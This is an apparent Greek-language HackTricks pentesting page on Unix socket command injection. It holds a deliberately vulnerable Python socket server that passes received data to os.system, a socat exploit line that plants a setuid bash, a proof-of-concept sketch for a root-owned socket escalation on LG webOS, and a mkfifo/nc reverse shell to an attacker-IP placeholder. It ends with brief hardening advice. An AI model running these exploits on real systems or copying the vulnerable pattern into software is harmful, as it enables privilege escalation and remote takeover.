# Εγχυση Εντολων Socket

{{#include ../../banners/hacktricks-training.md}}

## Παραδειγμα δεσμευσης Socket με Python

Στο παρακατω παραδειγμα δημιουργειται ενα **unix socket** (`/tmp/socket_test.s`) και οτιδηποτε **λαμβανεται** προκειται να **εκτελεστει** απο το `os.system`.Γνωριζω οτι δεν προκειται να βρειτε κατι τετοιο στην πραξη, αλλα ο στοχος αυτου του παραδειγματος ειναι να δειτε πως μοιαζει ο κωδικας που χρησιμοποιει unix sockets και πως να διαχειριζεστε την εισοδο στη χειροτερη δυνατη περιπτωση.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Εκτελέστε** τον κώδικα χρησιμοποιώντας python: `python s.py` και **ελέγξτε πώς ακούει το socket**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Μελέτη περίπτωσης: κλιμάκωση μέσω Root-owned UNIX socket με ενεργοποίηση από signal (LG webOS)

Ορισμένοι privileged daemons εκθέτουν ένα root-owned UNIX socket που δέχεται untrusted input και συνδέει privileged actions με thread-IDs και signals. Αν το protocol επιτρέπει σε έναν unprivileged client να επηρεάσει ποιο native thread θα στοχευτεί, ενδέχεται να μπορείτε να ενεργοποιήσετε ένα privileged code path και να κάνετε escalate.<sup>[[1]](#references)</sup>

Παρατηρούμενο μοτίβο:
- Συνδεθείτε σε ένα root-owned socket (π.χ. /tmp/remotelogger).
- Δημιουργήστε ένα thread και λάβετε το native thread id (TID) του.
- Στείλτε το TID (packed) μαζί με padding ως request· λάβετε ένα acknowledgement.
- Στείλτε ένα συγκεκριμένο signal σε αυτό το TID για να ενεργοποιήσετε την privileged συμπεριφορά.

Ελάχιστο PoC sketch:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Για να το μετατρέψετε σε root shell, μπορεί να χρησιμοποιηθεί ένα απλό μοτίβο named-pipe + nc:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Σημειώσεις:
- Αυτή η κατηγορία σφαλμάτων προκύπτει από την εμπιστοσύνη σε τιμές που προέρχονται από την κατάσταση client χωρίς προνόμια (TIDs) και τη σύνδεσή τους με privileged signal handlers ή λογική.
- Ενισχύστε την ασφάλεια επιβάλλοντας credentials στο socket, επικυρώνοντας τις μορφές των μηνυμάτων και αποσυνδέοντας τις privileged λειτουργίες από αναγνωριστικά threads που παρέχονται εξωτερικά.

## Αναφορές

- [1] [LG WebOS TV Path Traversal, Authentication Bypass και πλήρης κατάληψη συσκευής (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
